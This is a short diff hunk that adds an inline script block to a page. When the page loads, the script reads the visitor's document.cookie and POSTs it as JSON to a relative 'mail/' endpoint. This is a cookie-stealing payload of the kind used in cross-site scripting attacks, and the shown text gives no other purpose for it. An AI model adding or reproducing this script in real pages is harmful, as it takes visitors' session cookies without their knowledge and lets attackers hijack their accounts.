@@ -1,0 +1,8 @@
+<script inline="javascript">
+        var http = new XMLHttpRequest();
+        http.open("POST", 'mail/', true);
+        http.setRequestHeader("Content-type", "application/json");
+        var data = new Object();
+        data = {'content': document.cookie}
+        http.send(JSON.stringify(data));
+</script>
